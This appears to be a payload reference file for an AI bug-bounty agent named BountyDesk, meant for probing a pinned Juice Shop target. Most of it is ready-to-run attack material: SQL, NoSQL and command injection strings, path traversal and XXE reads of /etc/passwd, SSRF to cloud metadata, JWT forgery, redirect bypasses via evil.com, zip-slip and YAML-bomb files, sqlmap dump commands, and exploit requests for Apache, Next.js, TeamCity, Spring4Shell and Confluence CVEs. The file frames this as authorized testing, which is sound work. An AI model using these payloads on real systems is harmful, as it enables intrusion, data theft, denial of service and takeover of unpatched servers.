---
name: bountydesk-payloads
description: Compact curated payload reference for the BountyDesk agent. SQL injection, XSS, command injection, SSRF, path traversal quick lists for authorized-target probing. Use during active probe phases when constructing evidence-grade requests.
---

# BountyDesk payload quick-reference

Lean set tuned for EVIDENCE-GRADE probing (confirm-or-deny, not spray).
Full libraries: SecLists (github.com/danielmiessler/SecLists). Rate-limit all.

## SQL injection (confirmation-grade)

```
' OR '1'='1
' OR 1=1--
' UNION SELECT NULL,NULL,NULL--
1' AND SLEEP(3)--            (time-based; observe ~3s delay)
1 AND 1=CAST((SELECT current_database()) AS INT)--   (error-based PG)
```
Confirm with auth bypass, data in response, or a deterministic timing delta.
Record exact request and response snippet.

## Command injection

```
; id
$(id)
`id`
| id
& sleep 5 &
```
Confirm with command output in the response, or a consistent timing delta.
Note context (quote-closed? piped?).

## Path traversal

```
../../../../etc/passwd
..\/..\/..\/etc/passwd
....//....//etc/passwd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
```
Confirm with `root:x:0:0` or known file content returned. SPA fallbacks
returning `index.html` are NOT traversal; validate content, not status alone.

## SSRF

```
http://127.0.0.1:<port>
http://169.254.169.254/latest/meta-data/
file:///etc/passwd
gopher://127.0.0.1:6379/_%2BINFO%2B
```
Only where the target fetches URLs by design. NEVER actually contact cloud
metadata from your own tooling, the guard hard-denies it; if a TARGET's
response indicates it fetched metadata, that is the finding (report what the
target did, do not repeat it).

## XSS (confirmation via marker, not alert())

```
"><script>console.log('BOUNTYDESK_MARKER')</script>
<img src=x onerror="console.log('BOUNTYDESK_MARKER')">
{{7*7}}          (template engines)
${7*7}           (EL/template variants)
```
An unencoded marker in the response body is a lead, not confirmation:
reflection can land in a non-executing context (an attribute value, an
already-escaped-elsewhere sink, a response that's never rendered as HTML) and
still look unencoded in a raw body dump. Confirm execution the way
`bountydesk-challenges` does for DOM XSS: render the response in headless
`chromium` and check for an observable post-load mutation (`document.title`
changed, a node appended), or, for template payloads, that the math actually
evaluated (`49` in the response, not the literal `{{7*7}}`). Console.log
markers avoid side effects vs alert() once you're confirming via a real
render.

## JWT algorithm confusion (RS256 to HS256)

Generalized beyond any one target, three steps, not just the forge command:

```bash
# 1. locate the RSA public key: config, /.well-known/jwks.json, a leaked
#    static asset, or bundled in the app's own source if available
curl -s "<url>/.well-known/jwks.json"
grep -rn "PUBLIC KEY\|jwt.pub\|RS256" <source-if-available>
# 2. confirm the alg field is attacker-controllable
jwt_tool <token> -T                          # tamper mode, inspect header
# 3. forge: sign with HS256 using the RSA public key AS the HMAC secret
jwt_tool <token> -X k -pk <pubkey.pem>
```
Confirm with the forged token accepted by an endpoint that should require the
original signer (e.g. an admin-only route).

## IDOR / BOLA enumeration

```bash
# sweep a predictable ID space against an authenticated endpoint, diffing
# CONTENT not just status: many apps 200 an empty/redacted object for
# out-of-scope IDs, so a bare status check false-positives
for id in $(seq 1 50); do
  curl -s -H "Authorization: Bearer $TOKEN" "<url>/api/resource/$id" \
    -o "artifacts/idor_$id.json" -w "$id: %{http_code}\n"
done
```
Confirm with another user's real data (not your own, not an empty/error
shape) returned under your own auth context.

## NoSQL injection (MongoDB-shaped targets)

Operator injection via a JSON body, not form-encoding:

```bash
# auth bypass
curl -s -X POST "<url>/login" -H "Content-Type: application/json" \
  -d '{"email":{"$ne":null},"password":{"$ne":null}}'
curl -s -X POST "<url>/login" -H "Content-Type: application/json" \
  -d '{"email":{"$gt":""},"password":{"$gt":""}}'
# blind boolean extraction
curl -s -X POST "<url>/login" -H "Content-Type: application/json" \
  -d '{"email":{"$regex":"^admin"},"password":{"$ne":null}}'
```
Confirm with an auth bypass, or a response that changes shape based on the
injected boolean (classic blind-injection oracle).

## CSRF PoC generation

For a state-changing endpoint found to lack CSRF protection:

```bash
cat > artifacts/csrf_poc.html <<HTML
<form action="<url>/<endpoint>" method="POST" id="f">
  <input name="<param>" value="<value>">
</form>
<script>document.getElementById('f').submit()</script>
HTML
```
Confirm by loading it in a session cookie'd as the victim (the same
`chromium --headless --dump-dom` technique as the DOM-XSS recipe in
`bountydesk-challenges`: load the PoC, then check the target state actually
changed).

## Redirect-allowlist bypass

Most real-world allowlist bypasses exploit a `startsWith()`/`includes()`
check rather than a proper URL parse-and-compare. If source is available (see
`bountydesk-challenges` §2b), read the check before guessing; if not, try:

```
<url>/redirect?to=https://real-allowed-host.evil.com
<url>/redirect?to=https://real-allowed-host@evil.com
<url>/redirect?to=//evil.com
<url>/redirect?to=https://evil.com#https://real-allowed-host
```
Confirm with the final `Location` header or rendered navigation leaving the
allowlisted host.

## File-upload attack chains

```bash
# zip path traversal: write outside the intended extraction dir
python3 -c "
import zipfile
z = zipfile.ZipFile('artifacts/evil.zip','w')
z.writestr('../../../../tmp/bountydesk_marker.txt','PWNED')
z.close()"
curl -s -F "file=@artifacts/evil.zip" "<url>/file-upload"

# XXE via an XML-bearing upload (DOCX, SVG, any XML-parsed format)
cat > artifacts/xxe.xml <<'XML'
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
XML

# YAML bomb (billion-laughs), DoS confirmation ONLY, requires its own
# grant, always timeboxed, never against a shared/multi-tenant sandbox
cat > artifacts/yaml_bomb.yaml <<'YML'
a: &a ["x","x","x","x","x","x","x","x","x"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
YML
```

## Tool-backed recipes (prebaked image; embed SCOPE_GUARD_GRANT)

Prefer these over hand-rolled payloads once a vuln class is suspected, they
produce reproducible artifacts that clear the 5-check gate faster.

```bash
# SQLi (DVWA/Juice Shop/VAmPI/DSVW), dump proof, not just detect
sqlmap -u "<url>?id=1" --batch --level=2 --risk=2 --dbs --output-dir=artifacts/sqlmap
sqlmap -u "<url>" --data="username=a&password=b" --batch --dump -T users --output-dir=artifacts/sqlmap

# JWT: RS256->HS256 confusion (Juice Shop admin forgery), none-alg, weak-secret
jwt_tool <token> -X k -pk artifacts/pubkey.pem      # key confusion
jwt_tool <token> -X a                               # alg:none
jwt_tool <token> -C -d /usr/share/wordlists/*.txt   # crack weak HMAC secret

# Params / hidden endpoints / dir brute
arjun -u "<url>" -oJ artifacts/arjun.json           # discover hidden params
ffuf -u "<url>/FUZZ" -w <wordlist> -o artifacts/ffuf.json
gobuster dir -u "<url>" -w <wordlist> -o artifacts/gobuster.txt

# XSS at scale (reflected/DOM sink discovery)
dalfox url "<url>?q=FUZZ" -o artifacts/dalfox.txt

# Template scan + TLS
nuclei -u "<url>" -severity low,medium,high,critical -rl 20 -o artifacts/nuclei.txt
testssl.sh --quiet --jsonfile artifacts/testssl.json "<host>:443"
```

## Known-CVE recipes (inert: not part of BountyDesk's target set today)

Everything below is carried over from the Sentinel prototype, which probed
arbitrary named CVEs across any host it was pointed at. BountyDesk targets
exactly one pinned application (the connected Juice Shop fork) and doesn't
run against these products today, so treat this section as reference
material for a future target, not something to act on now. It's kept rather
than deleted because the recipe shape (fingerprint, then a two-request
behavioral diff, then a detector script) is reusable once BountyDesk takes on
a target where one of these applies.

### CVE-2025-29927, Next.js middleware auth bypass (Critical, self-hosted only)

Fingerprint Next.js first (`x-powered-by: Next.js`, `/_next/static/...`,
`__NEXT_DATA__`). If middleware gates a route, confirm the bypass with a
two-request behavioral diff (send `x-middleware-subrequest`; a redirect/401/
403 turning into 200 means middleware was skipped). Detection and
exploitation are the same primitive: one header, no auth. Version-dependent
payload (widest first):

```bash
# clean vs spoofed on a middleware-gated route
curl -s -o /dev/null -w '%{http_code}\n' --max-redirs 0 "<url>/admin"   # e.g. 307/401
curl -s -w '%{http_code}\n' --max-redirs 0 \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  "<url>/admin"                                                          # 200 => VULNERABLE
# payload fallbacks: "src/middleware:..:x5", "middleware", "src/middleware", "pages/_middleware"
```
Patched at 15.2.3 / 14.2.25 / 13.5.9 / 12.3.5. Vercel-hosted is not
exploitable (edge strips the header). Works via `http_probe` for black-box
targets.

### CVE-2021-41773 / -42013, Apache 2.4.49/2.4.50 path traversal to RCE (Critical, CISA KEV)

`--path-as-is` is mandatory (curl must not normalise the `../`). File read via
a static alias prefix; RCE via a CGI prefix if `mod_cgi` is on. 2.4.49 uses
one `%2e` per `../`; 2.4.50 needs the double-encoded `%%32%65` form.

```bash
# file read (static prefix, e.g. /icons/)
curl -s --path-as-is "<url>/icons/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd"   # root:... => VULN
# RCE (CGI prefix + shell reachable)
curl -s --path-as-is --data 'echo Content-Type: text/plain; echo; id' \
  "<url>/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"                        # uid=... => VULN
```
Patched at 2.4.51 (2.4.50 was incomplete, hence -42013). Works via
`http_probe`.

### CVE-2024-27198, JetBrains TeamCity auth bypass to RCE (Critical, CISA KEV)

Reach any authenticated REST endpoint unauth via the alternate-path trick:
`/hax?jsp=/app/rest/<endpoint>;.jsp` (the `;.jsp` suffix passes the public-
resource check; the real endpoint executes). Read-only detection:
```bash
curl -s "<url>/hax?jsp=/app/rest/server;.jsp"     # returns server version JSON/XML => VULN
```
Full impact: POST to `/hax?jsp=/app/rest/users;.jsp` creates a SYSTEM_ADMIN
(lab only). Patched at 2023.11.4.

### CVE-2022-22965, Spring4Shell RCE (Critical)

Data-binding RCE on Spring MVC 5.3.x/5.2.x plus WAR plus Tomcat plus JDK 9+.
The `class.module.classLoader.resources.context.parent.pipeline.first.*`
gadget writes a JSP webshell into Tomcat's ROOT, then `GET /shell.jsp?cmd=id`.
Patched at Spring 5.3.18 / 5.2.20. Needs a data-binding endpoint (POJO param).

### CVE-2023-22515, Confluence broken access control (Critical, CISA KEV)

Unauth: flip `applicationConfig.setupComplete=false` via `/server-info.action`,
re-opening the setup wizard, then create a SYSTEM admin at
`/setup/setupadministrator.action`. Affected 8.0.0 to 8.5.1 (fixed 8.5.2).

## Usage rules

- One payload class per probe batch; log every request to artifacts.
- Any payload that could modify target state (POST/PUT) requires its own
  grant.
- Injection attempts against the BountyDesk pipeline itself (scope-guard,
  harness) are impossible by construction; payloads here are only for the
  scoped target inside the sandbox.
